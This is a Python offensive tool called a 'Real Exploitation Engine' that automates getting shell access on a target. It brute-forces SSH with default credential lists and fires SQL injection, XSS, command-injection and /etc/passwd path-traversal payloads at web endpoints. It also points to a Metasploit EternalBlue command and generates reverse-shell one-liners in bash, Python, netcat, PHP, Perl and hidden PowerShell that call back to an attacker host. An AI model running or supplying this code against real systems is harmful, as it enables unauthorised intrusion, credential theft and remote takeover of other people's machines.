#!/usr/bin/env python3
"""
Real Exploitation Engine - Initial Access & Shell Acquisition
SSH Brute Force, Web Exploitation, Auto Shell
"""

import subprocess
import socket
import requests
import time
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass


@dataclass
class ExploitResult:
    """Exploitation result"""
    success: bool
    method: str
    target: str
    shell_type: str = ""
    credentials: str = ""
    payload: str = ""
    error: str = ""


class RealExploitationEngine:
    """Real exploitation for initial access"""
    
    def __init__(self):
        self.successful_exploits = []
        
    def auto_get_shell(self, target: str) -> ExploitResult:
        """Try multiple methods to get shell access"""
        print(f"[*] Target: {target}")
        print(f"[*] Attempting automated shell acquisition...")
        
        # Parse target
        host = target.split(':')[0]
        
        # Try methods in order
        methods = [
            ('SSH Brute Force', self._try_ssh_brute),
            ('Web Exploitation', self._try_web_exploits),
            ('Common Vulnerabilities', self._try_common_vulns),
            ('Service Exploits', self._try_service_exploits),
        ]
        
        for method_name, method_func in methods:
            print(f"\n[*] Trying: {method_name}")
            result = method_func(host)
            if result.success:
                print(f"[+] SUCCESS! Got shell via {method_name}")
                return result
            print(f"[-] {method_name} failed")
        
        return ExploitResult(
            success=False,
            method="auto",
            target=target,
            error="All exploitation methods failed"
        )
    
    def _try_ssh_brute(self, host: str) -> ExploitResult:
        """Try SSH brute force with common credentials"""
        common_creds = [
            ('root', 'root'),
            ('root', 'toor'),
            ('root', ''),
            ('admin', 'admin'),
            ('admin', 'password'),
            ('user', 'user'),
        ]
        
        for username, password in common_creds:
            try:
                # Check if SSH port is open
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((host, 22))
                sock.close()
                
                if result != 0:
                    return ExploitResult(False, "ssh_brute", host, error="SSH port not open")
                
                # Try SSH login (requires sshpass)
                cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {username}@{host} 'echo SUCCESS'"
                proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                
                if 'SUCCESS' in proc.stdout:
                    return ExploitResult(
                        success=True,
                        method="ssh_brute",
                        target=host,
                        shell_type="ssh",
                        credentials=f"{username}:{password}"
                    )
            except:
                pass
        
        return ExploitResult(False, "ssh_brute", host, error="No valid credentials found")
    
    def _try_web_exploits(self, host: str) -> ExploitResult:
        """Try common web exploits"""
        urls = [
            f"http://{host}",
            f"https://{host}",
            f"http://{host}:8080",
            f"http://{host}:8000",
        ]
        
        for url in urls:
            try:
                # Test for SQL Injection
                sqli_payloads = ["' OR '1'='1", "admin'--", "1' OR '1'='1'--"]
                for payload in sqli_payloads:
                    test_url = f"{url}/login?user={payload}&pass={payload}"
                    resp = requests.get(test_url, timeout=5, verify=False)
                    if 'admin' in resp.text.lower() or 'dashboard' in resp.text.lower():
                        return ExploitResult(
                            success=True,
                            method="sqli",
                            target=host,
                            shell_type="web_shell",
                            payload=payload
                        )
                
                # Test for RCE
                rce_payloads = [
                    "; id",
                    "| whoami",
                    "$(whoami)",
                    "`id`"
                ]
                for payload in rce_payloads:
                    test_url = f"{url}/?cmd={payload}"
                    resp = requests.get(test_url, timeout=5, verify=False)
                    if 'uid=' in resp.text or 'root' in resp.text:
                        return ExploitResult(
                            success=True,
                            method="rce",
                            target=host,
                            shell_type="command_injection",
                            payload=payload
                        )
            except:
                pass
        
        return ExploitResult(False, "web_exploits", host, error="No web vulnerabilities found")
    
    def _try_common_vulns(self, host: str) -> ExploitResult:
        """Try common CVEs"""
        # Check for EternalBlue (MS17-010)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((host, 445))
            sock.close()
            
            if result == 0:
                # SMB port open, could be vulnerable to EternalBlue
                print("[*] SMB port 445 open - potential EternalBlue target")
                return ExploitResult(
                    success=False,
                    method="eternalblue",
                    target=host,
                    error="Use: msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {host}; run'"
                )
        except:
            pass
        
        return ExploitResult(False, "common_vulns", host, error="No common vulns detected")
    
    def _try_service_exploits(self, host: str) -> ExploitResult:
        """Try service-specific exploits"""
        # Scan common ports
        services = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            80: 'HTTP',
            443: 'HTTPS',
            3306: 'MySQL',
            5432: 'PostgreSQL',
            6379: 'Redis',
            27017: 'MongoDB',
        }
        
        open_services = []
        for port, service_name in services.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                sock.close()
                
                if result == 0:
                    open_services.append((port, service_name))
            except:
                pass
        
        if open_services:
            print(f"[*] Open services: {', '.join([f'{s}:{p}' for p,s in open_services])}")
        
        return ExploitResult(False, "service_exploits", host, error=f"Found {len(open_services)} open services")
    
    def ssh_brute_force(self, target: str, wordlist: Optional[str] = None) -> ExploitResult:
        """SSH brute force attack"""
        # Parse target
        if '@' in target:
            username, host = target.split('@')
        else:
            username = 'root'
            host = target
        
        print(f"[*] SSH Brute Force Attack")
        print(f"[*] Target: {username}@{host}")
        
        # Default wordlist if not provided
        if not wordlist:
            passwords = [
                '', 'root', 'toor', 'admin', 'password', '123456', 
                'password123', 'admin123', 'root123', 'letmein',
                'welcome', 'monkey', 'dragon', 'master', 'qwerty'
            ]
        else:
            try:
                with open(wordlist, 'r') as f:
                    passwords = [line.strip() for line in f]
            except:
                return ExploitResult(False, "ssh_brute", host, error="Cannot read wordlist")
        
        print(f"[*] Trying {len(passwords)} passwords...")
        
        for i, password in enumerate(passwords, 1):
            try:
                cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {username}@{host} 'echo SUCCESS' 2>/dev/null"
                proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                
                if 'SUCCESS' in proc.stdout:
                    print(f"\n[+] FOUND! {username}:{password}")
                    return ExploitResult(
                        success=True,
                        method="ssh_brute",
                        target=host,
                        shell_type="ssh",
                        credentials=f"{username}:{password}"
                    )
                
                if i % 5 == 0:
                    print(f"[*] Tried {i}/{len(passwords)} passwords...")
            except:
                pass
        
        return ExploitResult(False, "ssh_brute", host, error="No valid password found")
    
    def web_exploit(self, url: str) -> Dict:
        """Comprehensive web exploitation"""
        print(f"[*] Web Exploitation Scanner")
        print(f"[*] Target: {url}")
        
        vulnerabilities = {
            'sqli': [],
            'xss': [],
            'rce': [],
            'lfi': [],
            'path_traversal': []
        }
        
        # SQL Injection
        print("\n[*] Testing SQL Injection...")
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' UNION SELECT NULL--",
        ]
        for payload in sqli_payloads:
            try:
                resp = requests.get(f"{url}?id={payload}", timeout=5, verify=False)
                if 'error' not in resp.text.lower() and len(resp.text) > 0:
                    vulnerabilities['sqli'].append(payload)
                    print(f"  [+] Potential SQLi: {payload}")
            except:
                pass
        
        # XSS
        print("\n[*] Testing XSS...")
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        for payload in xss_payloads:
            try:
                resp = requests.get(f"{url}?search={payload}", timeout=5, verify=False)
                if payload in resp.text:
                    vulnerabilities['xss'].append(payload)
                    print(f"  [+] XSS vulnerable: {payload}")
            except:
                pass
        
        # RCE
        print("\n[*] Testing RCE...")
        rce_payloads = [
            "; id",
            "| whoami",
            "$(whoami)",
            "`id`"
        ]
        for payload in rce_payloads:
            try:
                resp = requests.get(f"{url}?cmd={payload}", timeout=5, verify=False)
                if 'uid=' in resp.text or 'root' in resp.text:
                    vulnerabilities['rce'].append(payload)
                    print(f"  [+] RCE vulnerable: {payload}")
            except:
                pass
        
        # Path Traversal / LFI
        print("\n[*] Testing Path Traversal/LFI...")
        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
        ]
        for payload in lfi_payloads:
            try:
                resp = requests.get(f"{url}?file={payload}", timeout=5, verify=False)
                if 'root:' in resp.text:
                    vulnerabilities['lfi'].append(payload)
                    print(f"  [+] LFI vulnerable: {payload}")
            except:
                pass
        
        total_vulns = sum(len(v) for v in vulnerabilities.values())
        print(f"\n[*] Found {total_vulns} vulnerabilities")
        
        return vulnerabilities
    
    def generate_reverse_shell(self, lhost: str, lport: int) -> Dict[str, str]:
        """Generate reverse shell payloads"""
        payloads = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'nc': f"nc -e /bin/sh {lhost} {lport}",
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        }
        
        return payloads
